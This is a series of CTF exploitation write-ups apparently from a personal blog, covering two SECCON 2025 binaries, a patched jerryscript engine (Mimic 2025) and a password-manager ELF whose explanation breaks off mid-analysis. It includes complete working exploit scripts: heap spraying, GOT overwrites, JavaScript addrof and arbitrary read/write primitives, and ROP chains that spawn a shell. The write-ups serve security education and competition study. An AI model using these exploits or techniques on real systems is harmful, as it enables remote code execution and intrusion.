[{"content":"Overview The challenge consists in a simple C++ binary that let\u0026rsquo;s you push and pop unsigned longs on two std::stacks named S and T. At startup you can also provide a name that is then printed (this will be useful to leak).\n#include \u0026lt;iostream\u0026gt; #include \u0026lt;stack\u0026gt; std::string name; std::stack\u0026lt;size_t\u0026gt; S, T; int main() { size_t op, val; std::cout \u0026lt;\u0026lt; \u0026#34;What\u0026#39;s your name?\u0026#34; \u0026lt;\u0026lt; std::endl; std::cin \u0026gt;\u0026gt; name; std::cout \u0026lt;\u0026lt; \u0026#34;Hello, \u0026#34; \u0026lt;\u0026lt; name \u0026lt;\u0026lt; \u0026#34;!\u0026#34; \u0026lt;\u0026lt; std::endl; while (std::cin.good()) { std::cin \u0026gt;\u0026gt; op; if (op == 1) { std::cin \u0026gt;\u0026gt; val; S.push(val); } else if (op == 2) { S.pop(); } else if (op == 3) { std::cin \u0026gt;\u0026gt; val; T.push(val); } else if (op == 4) { T.pop(); } else { break; } } return 0; } Vulnerability We can pop even if a stack is empty. To exploit this we need to deep dive into how a std::stack is implemented.\nstruct stack // sizeof=0x50 { void **_M_map; size_t _M_map_size; struct iterator _M_start; struct iterator _M_finish; }; struct iterator // sizeof=0x20 { void *_M_cur; void *_M_first; void *_M_last; void **_M_node; }; Things to notice:\nNodes are arrays of size 0x200 that contain the actual data you push on the stack There are two iterators because a std::stack is basically a std::deque. _M_start doesn\u0026rsquo;t usually move (we didn\u0026rsquo;t actually deep dive into that tho) and _M_finish is the actual cursor that keeps track of the top of the stack. _M_node points at the node pointer inside _M_map _M_map is a dynamic array of node pointers The first node pointer is put at the center of the map (probably useful for deques) If a node is full, another one gets allocated and the pointer put after the last one in the map If a node is empty it\u0026rsquo;s freed and the current node becomes the previous one If a map is full (\u0026lt;2 slots remaining) it\u0026rsquo;s reallocated If we pop stuff from an empty stack we trigger point 4.3 in the list above, but as there are no previous nodes in the map, the finish iterator will then point to whatever value is present in the map before the pointer to the first node. That value is usually zero, so if we try to push or pop more stuff in that stack the program crashes.\nExploitation NOTE: The program is compiled with Partial RELRO and No PIE.\nTo exploit this vulnerability we need to somehow put a valid pointer in the map. The name is a std::string, this object is constantly reallocated when more data is put into it. This implies that if we send a huge name we will trigger some frees on chunks containing our data. In this way we can spray the heap with pointers, when a big chunk containing part of our name (pointers) gets freed it is put into the unsorted bin free-list, so we can trigger the reallocation of the map and have it allocated from the unsorted bin, keeping the memory inside it uninitialized. With this trick we can control a node pointer and achieve one write to an arbitrary location. We can use this write to override the _M_finish struct of the other stack, achieving finally arbitrary write.\nWith the arbitrary write we change the pointer to the string stored inside name, to make it point at the GOT entry of __cxa_atexit (which contains a libc pointer). Now we override the GOT entry of operator delete[] to make it point to main+95 (which is where the name is printed). operator delete[] is called inside the exit handlers so, upon exit, the program restarts and we get a libc leak. Now we can override the GOT entry of std::basic_istream with a one-gadget and get RCE.\nFinal Exploit #!/bin/env python3 import sys from pwn import context, ELF, args, remote, process, gdb, p64, info, success, u64, pause # # INIT # context.terminal = [\u0026#34;alacritty\u0026#34;, \u0026#34;--working-directory\u0026#34;, \u0026#34;./\u0026#34;, \u0026#34;-e\u0026#34;] elf = context.binary = ELF(\u0026#34;./st_patched\u0026#34;, False) libc = ELF(\u0026#34;./libs/libc.so.6\u0026#34;, False) libcpp = ELF(\u0026#34;./libs/libstdc++.so.6\u0026#34;, False) gs = \u0026#34;\u0026#34;\u0026#34; continue \u0026#34;\u0026#34;\u0026#34; def start(argv): if args.REMOTE: if len(argv) != 2: print(f\u0026#34;Usage:\\t{argv[0]} \u0026lt;IP\u0026gt;:\u0026lt;PORT\u0026gt; REMOTE\u0026#34;) exit(-1) (IP, PORT) = argv[1].split(\u0026#34;:\u0026#34;) return remote(IP, int(PORT)) elif args.GDB: return gdb.debug(elf.path, gs, aslr=True) else: return process(elf.path) # # UTILS # ONE_GADGET = 0x583f3 # # FUNCTIONS # def s_push(val): io.sendline(b\u0026#34;1\u0026#34;) io.sendline(str(val).encode()) def s_pop(): io.sendline(b\u0026#34;2\u0026#34;) def t_push(val): io.sendline(b\u0026#34;3\u0026#34;) io.sendline(str(val).encode()) def t_pop(): io.sendline(b\u0026#34;4\u0026#34;) # # EXPLOIT # def main(argv): global io io = start(argv) # heap spray name = p64(elf.sym[\u0026#34;T\u0026#34;]) * 0x100 io.sendlineafter(b\u0026#34;?\\n\u0026#34;, name) for _ in range(5): for i in range(64): s_push(0xdeadbeefcafe0000 + 0x30 + i) for _ in range(5): for i in range(64): s_pop() # Now S.finish points to T s_pop() # Getting curr on top of T for _ in range(57): s_pop() info(f\u0026#34;Target __cxa_atexit: {hex(elf.got[\u0026#39;__cxa_atexit\u0026#39;])}\u0026#34;) # T.finish.cur s_push(elf.got[\u0026#39;__cxa_atexit\u0026#39;]+0x20) # operator delete # T.finish.first s_push(elf.got[\u0026#39;__cxa_atexit\u0026#39;]-0x20) # T.finish.last s_push(elf.got[\u0026#39;__cxa_atexit\u0026#39;]-0x20+0x1000) # Overwrite __cxa_atexit t_push(elf.sym[\u0026#34;main\u0026#34;]+95) # Overlap T with name for _ in range(3): s_pop() s_push(elf.sym[\u0026#34;_Z4nameB5cxx11\u0026#34;]) # Overwrite name t_push(elf.got[\u0026#39;__cxa_atexit\u0026#39;]) io.sendline(b\u0026#34;0\u0026#34;) io.recvuntil(b\u0026#34;Hello, \u0026#34;) io.recvuntil(b\u0026#34;Hello, \u0026#34;) libc_leak = u64(io.recv(8)) success(f\u0026#34;libc leak: {hex(libc_leak)}\u0026#34;) libc.address = libc_leak - 0x471f0 s_pop() # T.finish.cur s_push(elf.got[\u0026#39;__cxa_atexit\u0026#39;]+0x48) # ios_good # T.finish.first s_push(elf.got[\u0026#39;__cxa_atexit\u0026#39;]-0x20) # T.finish.last s_push(elf.got[\u0026#39;__cxa_atexit\u0026#39;]-0x20+0x1000) for i in range(9): s_pop() s_push(0) t_push(libc.address + ONE_GADGET) io.interactive() if __name__ == \u0026#34;__main__\u0026#34;: sys.exit(main(sys.argv)) FLAG: SECCON{y0u_uNd3Rs74nd_H0w_t0_3xpLo1t_tH3_\u0026quot;stack\u0026quot;}\n","permalink":"http://leo1.cc/posts/writeups/seccon25-cursedst/","summary":"Pop on an empty std::stack?!","title":"Seccon Quals 2025 - CursedST"},{"content":"Overview The challenge consists in a simple c program that takes your input and \u0026ldquo;unserializes\u0026rdquo; it.\nint main() { char buf[0x100]; setbuf(stdin, NULL); setbuf(stdout, NULL); if (unserialize(stdin, buf, sizeof(buf)) \u0026lt; 0) { puts(\u0026#34;[-] Deserialization faield\u0026#34;); } else { puts(\u0026#34;[+] Deserialization success\u0026#34;); } return 0; } The unserialize function looks like this.\nssize_t unserialize(FILE *fp, char *buf, size_t size) { char szbuf[0x20]; char *tmpbuf; for (size_t i = 0; i \u0026lt; sizeof(szbuf); i++) { szbuf[i] = fgetc(fp); if (szbuf[i] == \u0026#39;:\u0026#39;) { szbuf[i] = 0; break; } if (!isdigit(szbuf[i]) || i == sizeof(szbuf) - 1) { return -1; } } if (atoi(szbuf) \u0026gt; size) { return -1; } tmpbuf = (char*)alloca(strtoul(szbuf, NULL, 0)); size_t sz = strtoul(szbuf, NULL, 10); for (size_t i = 0; i \u0026lt; sz; i++) { if (fscanf(fp, \u0026#34;%02hhx\u0026#34;, tmpbuf + i) != 1) { return -1; } } memcpy(buf, tmpbuf, sz); return sz; } This reads the input string until a : and converts it to an unsigned long size. Then it uses the size to allocate a buffer on the stack and finally lets us write arbitrary data into that buffer.\nVulnerability unserialize calls strtoul(szbuf, NULL, 0) to get the size for the buffer, but then it uses strtoul(szbuf, NULL, 10) to read the bytes inside it.\nFrom the man page of strtoul:\n[\u0026hellip;] a zero base is taken as 10 (decimal) unless the next character is \u0026lsquo;0\u0026rsquo;, in which case it is taken as 8 (octal).\nWe can trigger a number base confusion (I just made up the name lmao) in unserialize, by giving a number that starts with 0. Another thing to notice in the man page is\nThe remainder of the string is converted to an unsigned long int value in the obvious manner, stopping at the first character which is not a valid digit in the given base.\nSo we can stop the conversion by giving an invalid octal number, for example 9. Our payload will look like this 0199: What will happen when unserialize is called is the following:\nthe part of the string before : is used every character is a digit, so the check passes (this is why we can\u0026rsquo;t input hexadecimal numbers, because they contain an x which is not a digit) atoi(szbuf) is 199, so the check passes now strtoul will decode our number as octal, returning 1 alloca(1) will allocate 0x10 bytes to keep the stack aligned strtoul is called with base 10 so we can get a stack overflow of 199-16 bytes NOTE: you could trick also atoi using 04294967296 (which is 0x100000000) and get a huge overflow, but I just realized it.\nExploitation The binary has No PIE and is statically compiled.\nWe have a stack BOF, we need to bypass the canary somehow. To better understand the stack layout I opened up IDA and decompiled it.\n// the overflow starts here unsigned __int64 v4; // rax void *tmpbuf; // rsp int v6; // r8d int v7; // r9d char v8[8]; // [rsp+8h] [rbp-70h] BYREF unsigned __int64 size; // [rsp+10h] [rbp-68h] __int64 buf; // [rsp+18h] [rbp-60h] __int64 fp; // [rsp+20h] [rbp-58h] unsigned __int64 i; // [rsp+28h] [rbp-50h] unsigned __int64 j; // [rsp+30h] [rbp-48h] char *v14; // [rsp+38h] [rbp-40h] unsigned __int64 v15; // [rsp+40h] [rbp-38h] _BYTE szbuf[40]; // [rsp+48h] [rbp-30h] BYREF unsigned __int64 canary; // [rsp+70h] [rbp-8h] We can overflow until j, which is the index of the last for loop in unserialize. Then override j with 0x87, this will trick the for loop into skipping some iterations and resume from the offset of the return address on the stack. Then we can just ROP. NOTE: we need to restore fp and buf while we overflow.\nFinal exploit #!/usr/bin/env python3 from pwn import * exe = ELF(\u0026#34;./chall_patched\u0026#34;) context.binary = exe context.terminal = [\u0026#34;alacritty\u0026#34;, \u0026#34;-e\u0026#34;] NC_CMD = \u0026#34;nc unserialize.seccon.games 5000\u0026#34; gdbscript = \\ \u0026#34;\u0026#34;\u0026#34; \u0026#34;\u0026#34;\u0026#34; def conn(): if args.LOCAL: r = process([exe.path]) elif args.GDB: r = gdb.debug([exe.path], gdbscript=gdbscript, aslr=True) else: r = remote(NC_CMD.split(\u0026#34; \u0026#34;)[1], int(NC_CMD.split(\u0026#34; \u0026#34;)[2])) return r def main(): r = conn() payload = b\u0026#34;0199:\u0026#34; # payload = b\u0026#34;04294967296:\u0026#34; r.send(payload) sleep(0.1) POP_RSI = 0x000000000043617e POP_RAX = 0x00000000004303ab SYSCALL = 0x0000000000415d36 rop_chain = flat(POP_RSI, 0, POP_RAX, 0x3b, SYSCALL) payload = b\u0026#34;/bin/sh\\0\u0026#34; + b\u0026#34;A\u0026#34;*0x18 + flat(0x4CA760, 0x4ca440) + b\u0026#34;B\u0026#34;*8 + p8(0x87) payload += rop_chain payload = payload.ljust(0x200, b\u0026#34;\\0\u0026#34;) for i in range(len(payload)): r.sendline(payload[i].to_bytes().hex().encode()) r.interactive() if __name__ == \u0026#34;__main__\u0026#34;: main() FLAG: SECCON{ev3rY_5tR1ng_c0nV3rs10n_wOrKs_1n_a_d1fFeR3n7_w4y}\n","permalink":"http://leo1.cc/posts/writeups/seccon25-unserialize/","summary":"Warmup challenge featuring a \u0026ldquo;number conversion base confusion\u0026rdquo;.","title":"Seccon Quals 2025 - unserialize"},{"content":"Two weeks ago I went to Nanjing, China to take part in the 2025 Qiangwang Challenge on Cyber Mimic Defense Finals with the ARESx team. Me and my buddy @BitFriends full cleared pwn during the CTF and in this writeup we are going to talk about a really nice browser challenge we encountered.\nOverview The challenge consisted in a patched version of jerryscript, a \u0026ldquo;lightweight JavaScript engine intended to run on a very constrained devices such as microcontrollers\u0026rdquo;.\nThe patch was the following:\ndiff --git a/jerry-core/ecma/operations/ecma-conversion.c b/jerry-core/ecma/operations/ecma-conversion.c index cf0c9fde..5c1b7aa2 100644 --- a/jerry-core/ecma/operations/ecma-conversion.c +++ b/jerry-core/ecma/operations/ecma-conversion.c @@ -905,7 +905,6 @@ ecma_op_to_integer (ecma_value_t value, /**\u0026lt; ecma value */ /* 3 */ if (ecma_number_is_nan (number)) { - *number_p = ECMA_NUMBER_ZERO; return ECMA_VALUE_EMPTY; } Vulnerability Looking though the source code of the original non-patched function, we can see that it follows the ECMA-262 standard (as it should), in particular the ECMA-262 v6, 7.1.4 specification on how to implement a correct to_integer operation.\nThe entire patched function is this:\necma_value_t ecma_op_to_integer (ecma_value_t value, /**\u0026lt; ecma value */ ecma_number_t *number_p) /**\u0026lt; [out] ecma number */ { if (ECMA_IS_VALUE_ERROR (value)) { return value; } /* 1 */ ecma_value_t to_number = ecma_op_to_number (value, number_p); /* 2 */ if (ECMA_IS_VALUE_ERROR (to_number)) { return to_number; } ecma_number_t number = *number_p; /* 3 */ if (ecma_number_is_nan (number)) { // *number_p = ECMA_NUMBER_ZERO; return ECMA_VALUE_EMPTY; } /* 4 */ if (ecma_number_is_zero (number) || ecma_number_is_infinity (number)) { return ECMA_VALUE_EMPTY; } ecma_number_t floor_fabs = (ecma_number_t) floor (fabs (number)); /* 5 */ *number_p = ecma_number_is_negative (number) ? -floor_fabs : floor_fabs; return ECMA_VALUE_EMPTY; } where value is the value to convert and number_p is the pointer to where the output integer should be stored. The return value is just a status that can represent success or a failure error.\nTo trigger the patched code we need to provide NaN as value, in this way ecma_op_to_number gets called and we get *number_p = NaN, then number = *number_p and we get inside the patched if statement and return.\nSo, long story short: this patch enables us to have *number_p = NaN if we call ecma_op_to_integer with value equals to NaN. This would not have been possible in a correctly implementedto_integerfunction!\nAt this point we were kinda stuck for a bit because we needed to find a higher level function that would rely on to_integer not returning NaN and that would break if it did. As NaN is a value stored in memory as 0x7ff8000000000000 we assumed that this huge number could lead to some sort of OOB somewhere, but after looking though every single call to to_integer we were not able to find a use for it.\nAt some point I was looking at this function:\nbool ecma_number_is_nan (ecma_number_t num) /**\u0026lt; ecma-number */ { bool is_nan = (num != num); return is_nan; } And I was like \u0026ldquo;WTF is this comparison?\u0026rdquo;.\nAfter a quick conversation with GPT I realized that NaN is a special double value that returns False on every comparison, except if it is compared with itself. This widened the attack surface by a lot.\nThen looking again at all the functions using to_integer we stumbled upon the perfect one: ecma_op_dataview_create.\nFor those of you that don\u0026rsquo;t know, a dataview is an object that lets you read and write raw bytes inside of an ArrayBuffer. For dataviews you can also specify an offset and a size, if you want to target only a smaller part of the whole buffer.\nThat function uses to_index (which internally relies on to_integer) to convert the offset provided, then there are a bunch of bounds checks that make sure the dataview doesn\u0026rsquo;t go OOB and finally the object gets set with all the required parameters and returned.\n... /* 11 - 14. */ ecma_dataview_object_t *dataview_obj_p = (ecma_dataview_object_t *) object_p; dataview_obj_p-\u0026gt;header.u.cls.type = ECMA_OBJECT_CLASS_DATAVIEW; dataview_obj_p-\u0026gt;header.u.cls.u3.length = view_byte_length; dataview_obj_p-\u0026gt;buffer_p = buffer_p; dataview_obj_p-\u0026gt;byte_offset = (uint32_t) offset; return ecma_make_object_value (object_p); But who cares about the bounds checks, right? We can just bypass them all by setting offset = NaN, at that point all comparisons that involve offset will return False and we can get a dataview with an OOB of arbitrary size!\nconst buffer = new ArrayBuffer(8); const dataView = new DataView(buffer, NaN, 0x10000); This is a PoC that allows us to get a dataview with OOB read/write\npwndbg\u0026gt; p dataview_obj_p-\u0026gt;header.u.cls.u3.length $1 = 65536 Nice, now exploitation time!\nExploitation Environment setup The provided binary was not compiled with symbols, so we had to rebuild it from source:\npython tools/build.py --debug NOTE: we had to patch the file /CMakeLists.txt to remove the \u0026ldquo;error-on-warning\u0026rdquo; flag. We commented out line 179 and removed the -Werror from line 231.\nTo debug the exploit you can break in the function ecma_op_dataview_get_set_view_value, which lets you examine memory access from the OOB dataview. For instance, a breakpoint can be set at ecma-dataview-object.c:373/ecma_op_dataview_get_set_view_value+1172, which stops the program right before access on the dataview memory via set*() methods.\nLeaks After just playing around for a bit, and checking what data can be accessed and overridden, we decided to go for leaks first. When doing simple analysis, it seemed like there is an uncompressed heap pointer right after our DataView:\n0x555555664768 \u0026lt;jerry_global_heap+744\u0026gt;:\t0x0000000000000000\t0x00250067005b0018 0x555555664778 \u0026lt;jerry_global_heap+760\u0026gt;:\t0x000000010000002c\t0x00000312004a6d68 0x555555664788 \u0026lt;jerry_global_heap+776\u0026gt;:\t0x00d4000e000002f3\t0x7ff8000000000000 0x555555664798 \u0026lt;jerry_global_heap+792\u0026gt;:\t0x0000000000000000\t0x00200074005e0011 0x5555556647a8 \u0026lt;jerry_global_heap+808\u0026gt;:\t0x0000000100200065\t0x0000000000000000 0x5555556647b8 \u0026lt;jerry_global_heap+824\u0026gt;:\t0x00000048000068c8\t0x010b01aa00000323 0x5555556647c8 \u0026lt;jerry_global_heap+840\u0026gt;:\t0x0064000000640032\t0x000100000d00000e 0x5555556647d8 \u0026lt;jerry_global_heap+856\u0026gt;:\t0x0000555555664758\t0x0000000000000000 We can easily retrieve this value using any get*() methods on our vulnerable dataview. However, we had to find out the hard way that offsets were not constant. Since the exploit code lives on the heap as well, offsets will change as we are writing the exploit. This is unhandy, but just requires a step we\u0026rsquo;d have done anyway: creating addrof and fakeobj primitives.\nBefore that, let\u0026rsquo;s quickly talk about the heap of jerryscript. It\u0026rsquo;s a big memory region adjacent to the BSS where all the objects are stored, as well as the exploit code and metadata. There is no sandbox at all.\nIf you want to know more about jerryscript exploitation and internals take a look at the official repo this great writeup from another CTF: https://github.com/pr0cf5/CTF-writeups/blob/master/2021/n1ctf-jerry/writeup.md\nPrimitives Let\u0026rsquo;s start with addrof. for this, we\u0026rsquo;ll try to create an array that is placed after our malicious dataview. We can initialize the array with numbers, to be able to scan and identify the location of the array (more on that in a minute). The actual goal would be to set individual elements of the newly created array to some object, and read it\u0026rsquo;s address back via the out-of-bounds we got.\nAs already mentioned, indexes and offsets are problematic. That\u0026rsquo;s why we needed to dynamically identify \u0026lsquo;overlapping\u0026rsquo; offsets from our dataview, and indexes from our new array by essentially scanning the heap. Here is how we did it:\nconst buffer = new ArrayBuffer(8); const dataView = new DataView(buffer, NaN, 0x10000); var a = new Array(128); for(let i=0; i\u0026lt;128; i++) { a[i] = 0x4242; } var fake_idx = 0xffffffff; var off = 0; for(let i=0; i\u0026lt;0x500; i++) { const ptr = dataView.getUint32(i*8, true); if(ptr == 0x42420) { print(\u0026#34;found \u0026#34; + ptr + \u0026#34; at offset \u0026#34; + i*8); off = i*8; dataView.setUint32(off, 0x43430, true); for(let j=0; j\u0026lt;128; j++) { if(a[j] == 0x4343) { print(\u0026#34;found overlapping idx \u0026#34; + j); fake_idx = j; break } } if(fake_idx != 0xffffffff) { break } } } This initializes the array with 0x4242 at first. we then use the oob from our dataview to search for that value in memory. Be careful to search for the actual tagged values. Integers are shifted left by 4 bits, so we gotta find 0x4242 \u0026lt;\u0026lt; 4 = 0x42420. Here is how it looks in memory from the start of the dataview:\n0x555555664788 \u0026lt;jerry_global_heap+776\u0026gt;:\t0x0000000000000000\t0x0025006b005f0018 0x555555664798 \u0026lt;jerry_global_heap+792\u0026gt;:\t0x000000010000002c\t0x0000033200576d68 0x5555556647a8 \u0026lt;jerry_global_heap+808\u0026gt;:\t0x00d4000e00000313\t0x7ff8000000000000 ... 0x555555664838 \u0026lt;jerry_global_heap+952\u0026gt;:\t0x0068000000680032\t0x000100000000000e 0x555555664848 \u0026lt;jerry_global_heap+968\u0026gt;:\t0x0000555555664778\t0xc003000f00000000 0x555555664858 \u0026lt;jerry_global_heap+984\u0026gt;:\t0x0000008000646dc8\t0x005401aa0000036b ... 0x555555664958 \u0026lt;jerry_global_heap+1240\u0026gt;: 0xd042a8350000001b\t0x6f20646e756f6615 0x555555664968 \u0026lt;jerry_global_heap+1256\u0026gt;: 0x697070616c726576\t0x262078646920676e 0x555555664978 \u0026lt;jerry_global_heap+1272\u0026gt;: 0x0004242000043430\t0x0004242000042420 0x555555664988 \u0026lt;jerry_global_heap+1288\u0026gt;: 0x0004242000042420\t0x0004242000042420 0x555555664998 \u0026lt;jerry_global_heap+1304\u0026gt;: 0x0004242000042420\t0x0004242000042420 0x5555556649a8 \u0026lt;jerry_global_heap+1320\u0026gt;: 0x0004242000042420\t0x0004242000042420 If we find this, we got the offset. now we use our oob to change the value in order to also identify the corresponding index. This results in getting an overlapping access by using offset and index. The addrof primitive can now be build like this:\nfunction addrof(obj) { a[fake_idx] = obj; var tagged = dataView.getUint32(off, true); a[fake_idx] = 0x4242; return (tagged \u0026amp; (~3)) } In jerryscript, object pointers are compressed and tagged. We just gotta clear the last two bits.\nGreat! We can now get the addresses of objects and calculate offsets between them. This comes in handy for our initial problem: getting a heap leak. We can use addrof to calculate the offset beween the dataview and the underlying buffer to get the correct offset and leak:\nvar offset = addrof(dataView) - addrof(buffer) var ptr = dataView.getBigInt64(offset, true) - 0x72588n; var got = ptr + 0x70dc0n; print(\u0026#34;pie base: \u0026#34; + ptr) Arbitrary r/w Well, now you\u0026rsquo;d typically craft a fakeobj primitive. Problem is that we are absolutely clueless about the full internal structure of objects in the jerryscript engine. We tried analyzing ArrayBuffers, and the only thing we could notice is the uncompressed pointer to it\u0026rsquo;s data, similar to BackingStore in v8. We will not include our failed attempts on creating a fakeobj primitive. We decided to stop messing with the stupid assertion errors and did something else.\nWe can just allocate an ArrayBuffer, find the offset with our addrof primitive and then use thee OOB to change the data pointer to a location we desire:\nvar target = new ArrayBuffer(0x10000); var target_view = new Uint32Array(target); target_view[0] = 0x41414141 target_view[1] = 0x42424242 target_view[2] = 0x43434343 target_view[3] = 0x44444444 var offset2 = addrof(target) - addrof(buffer) var ptr2 = dataView.getBigInt64(offset2, true); print(\u0026#34;backing store: \u0026#34; + ptr2) dataView.setBigInt64(offset2, got, true); ptr2 = dataView.getBigInt64(offset2, true); print(\u0026#34;backing store modified: \u0026#34; + ptr2) After quickly confirming the offset of the data pointer inside the ArrayBuffer object, we see the correct backing store being leaked and modified. Accessing the ArrayBuffer confirms our arbitrary read/write! From now on it\u0026rsquo;s an easy game. We leaked libc from the GOT of jerryscript, the stack from environ, and wrote a ROP chain on the stack and GG!\nFinal exploit const buffer = new ArrayBuffer(8); const dataView = new DataView(buffer, NaN, 0x10000); var a = new Array(128); for(let i=0; i\u0026lt;128; i++) { a[i] = 0x4242; } var fake_idx = 0xffffffff; var off = 0; for(let i=0; i\u0026lt;0x500; i++) { const ptr = dataView.getUint32(i*8, true); if(ptr == 0x42420) { print(\u0026#34;found \u0026#34; + ptr + \u0026#34; at offset \u0026#34; + i*8); off = i*8; dataView.setUint32(off, 0x43430, true); for(let j=0; j\u0026lt;128; j++) { if(a[j] == 0x4343) { print(\u0026#34;found overlapping idx \u0026#34; + j); fake_idx = j; break } } if(fake_idx != 0xffffffff) { break } } } function addrof(obj) { a[fake_idx] = obj; var tagged = dataView.getUint32(off, true); a[fake_idx] = 0x4242; return (tagged \u0026amp; (~3)) } // exploit goes here... var buf = new ArrayBuffer(8); var f64_buf = new Float64Array(buf); var u64_buf = new Uint32Array(buf); function ftoi(val) { // typeof(val) = float f64_buf[0] = val; return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) \u0026lt;\u0026lt; 32n); // Watch for little endianness } function itof(val) { // typeof(val) = BigInt u64_buf[0] = Number(val \u0026amp; 0xffffffffn); u64_buf[1] = Number(val \u0026gt;\u0026gt; 32n); return f64_buf[0]; } var offset = addrof(dataView) - addrof(buffer) var ptr = dataView.getBigInt64(offset, true) - 0x72588n; var got = ptr + 0x70dc0n; print(\u0026#34;pie base: \u0026#34; + ptr) var target = new ArrayBuffer(0x10000); var target_view = new Uint32Array(target); target_view[0] = 0x41414141 target_view[1] = 0x42424242 target_view[2] = 0x43434343 target_view[3] = 0x44444444 var offset2 = addrof(target) - addrof(buffer) var ptr2 = dataView.getBigInt64(offset2, true); print(\u0026#34;backing store: \u0026#34; + ptr2) dataView.setBigInt64(offset2, got, true); ptr2 = dataView.getBigInt64(offset2, true); print(\u0026#34;backing store modified: \u0026#34; + ptr2) var libc = (BigInt(target_view[1]) \u0026lt;\u0026lt; 32n) + BigInt(target_view[0]) - 0x224a00n + 0xed700n; print(\u0026#34;libc base: \u0026#34; + libc) var environ = libc + 0x34a2d0n - 0x13f578n; var pop_rdi = libc + 0x10f78bn; var ret = pop_rdi + 0x1n; var system = libc + 0x58750n; var binsh = libc + 0x1cb42fn; dataView.setBigInt64(offset2, environ, true); ptr2 = dataView.getBigInt64(offset2, true); print(\u0026#34;backing store modified: \u0026#34; + ptr2) var stack = (BigInt(target_view[1]) \u0026lt;\u0026lt; 32n) + BigInt(target_view[0]) + 0x138n - 0x270n - 0x8n; print(\u0026#34;stack: \u0026#34; + stack) dataView.setBigInt64(offset2, stack, true); ptr3 = dataView.getBigInt64(offset2, true); print(\u0026#34;backing store modified: \u0026#34; + ptr3) target_view[2] = Number(ret \u0026amp; 0xffffffffn) target_view[3] = Number(ret \u0026gt;\u0026gt; 32n) target_view[4] = Number(pop_rdi \u0026amp; 0xffffffffn) target_view[5] = Number(pop_rdi \u0026gt;\u0026gt; 32n) target_view[6] = Number(binsh \u0026amp; 0xffffffffn) target_view[7] = Number(binsh \u0026gt;\u0026gt; 32n) target_view[8] = Number(system \u0026amp; 0xffffffffn) target_view[9] = Number(system \u0026gt;\u0026gt; 32n) ","permalink":"http://leo1.cc/posts/writeups/mimic25-cherry/","summary":"Exploiting jerryscript in China","title":"Mimic 2025 - Cherry"},{"content":"Overview This challenge consists in an ELF binary that allows a user to store hostnames (URLs) and passwords, it provides the following features:\nAdd Entry: given a URL and a password it saves them in an array, encrypting the password with a randomly generated key View Entries: given an index the binary decrypts the password and prints it along with the URL NOTES: The \u0026ldquo;encryption\u0026rdquo; is a simple xor with the random key:\nv7 = pw_len - 1; if (pw_len \u0026gt; 0 ) { do { password[i] ^= global_key[i \u0026amp; 0x3F]; v8 = i++; }while ( v8 != v7 ); } URLs and passwords get saved in structs:\nstruct entry { char host[128]; char password[256]; size_t pw_len; }; These structs reside within a global array of size 9.\nVulnerabilities Before saving an hostname inside the array the URL gets parsed:\nchar *__fastcall parse_hostname(char *buf) { char *result; // rax char *hostname; // [rsp+18h] [rbp-28h] size_t len_hostname; // [rsp+20h] [rbp-20h] char *urll; // [rsp+30h] [rbp-10h] char *hostname_noport; // [rsp+38h] [rbp-8h] hostname = url; urll = strstr(url, \u0026#34;://\u0026#34;); if ( urll ) hostname = urll + 3; hostname_noport = strchr(hostname, \u0026#39;:\u0026#39;); if ( hostname_noport ) { len_hostname = hostname_noport - hostname; if ( (unsigned __int64)(hostname_noport - hostname) \u0026gt; 0x80 ) len_hostname = 127LL; strncpy(buf, hostname, len_hostname); result = \u0026amp;buf[len_hostname]; buf[len_hostname] = 0; } else { strncpy(buf, hostname, 0x80uLL); result = buf + 127; buf[127] = 0; } return result; } url is a global string of size 256 bytes that contains the inputted URL.\nWhat this function does is simply extracting the hostname from a URL, removing the protocol and the port (if present) and saving it inside buf . For example: https://leo1.cc:443 -\u0026gt; leo1.cc\nAs buf is 128 bytes long (it\u0026rsquo;s basically entry.host within the struct), if the length of the hostname is exactly 128 bytes + \u0026ldquo;:\u0026rdquo; it passes the size check but gets null-terminated in the 129th byte. This is due to the (hostname_noport - hostname) \u0026gt; 0x80, which should have been \u0026gt;= 0x80. As the password is saved in the struct after the hostname, the null byte of the latter gets overwritten by the password itself. This leads to a buffer overflow in the view_entries function.\nLet\u0026rsquo;s take a step back and look more closely at the view_entries function.\nchar msg[384]; ... entry = \u0026amp;entries[idx]; password = entry-\u0026gt;password; msg_size = snprintf(msg, 0x180uLL, \u0026#34;Hostname: %s\\nPassword: \u0026#34;, entry-\u0026gt;host); pw_len = entry-\u0026gt;pw_len; v4 = \u0026amp;msg[msg_size]; pw_space = 384LL - msg_size; i = 0LL; v7 = pw_len - 1; // in-memory xor if (pw_len \u0026gt; 0 ) { do { password[i] ^= global_key[i \u0026amp; 0x3F]; v8 = i++; } while ( v8 != v7 ); } pw_len_1 = strlen(password); if ( pw_len_1 \u0026gt; pw_space ) pw_len_1 = pw_space; memcpy(v4, password, pw_len_1); // memcpy is just for semplification msg[383] = 0; puts(msg); What this code does is it prepares the msg buffer and then prints it. This is a weird approach and stands out. Also note that the password is appended to the buffer and that this is done using msg_size, the return value of snprintf. As we created an hostname which is not null-terminated (so it\u0026rsquo;s basically the concatenation of hostname and password), msg_size can be bigger than 384, leading to an overflow.\nThe reason is written in the man page of snprintf:\nIf the output was truncated due to this limit then the return value is the number of characters (excluding the terminating null byte) which would have been written to the final string if enough space had been available. As v4 = \u0026amp;msg[msg_size]; the password can be written at an offset from the end of msg on the stack, jumping even the the canary if we want!\nExploitation Overflowing the stack Based on these vulnerabilities I wrote a simple payload to override stuff after the canary with some good old \u0026ldquo;A\u0026quot;s.\nhostname = b\u0026#34;B\u0026#34;*128 + b\u0026#34;:\u0026#34; password = b\u0026#34;A\u0026#34;*255 What happens here is that the length returned by snprintf is greater than the size of msg, so our password gets written just after the canary. But now, what\u0026rsquo;s after the canary?\nWell, some saved registers and the return address of course!\npop rbx pop r12 pop r13 pop r14 pop r15 retn 00:0000│ 0x7fffffffe4f8 ◂— 0x34e276c4e7dbf600 01:0008│ rsp 0x7fffffffe500 —▸ 0x7fffffffe534 ◂— 0xe7dbf60000000002 02:0010│ 0x7fffffffe508 —▸ 0x555555556650 ◂— 0x632a25642500203e /* \u0026#39;\u0026gt; \u0026#39; */ 03:0018│ 0x7fffffffe510 —▸ 0x555555556648 ◂— 0x74697845202e33 /* \u0026#39;3. Exit\u0026#39; */ 04:0020│ 0x7fffffffe518 —▸ 0x555555556638 ◂— \u0026#39;2. View Entries\u0026#39; 05:0028│ 0x7fffffffe520 —▸ 0x55555555662b ◂— \u0026#39;1. Add Entry\u0026#39; 06:0030│ 0x7fffffffe528 —▸ 0x555555555327 ◂— jmp 0x555555555250 As you can see these registers contain char* that will be used to print the banner in the main 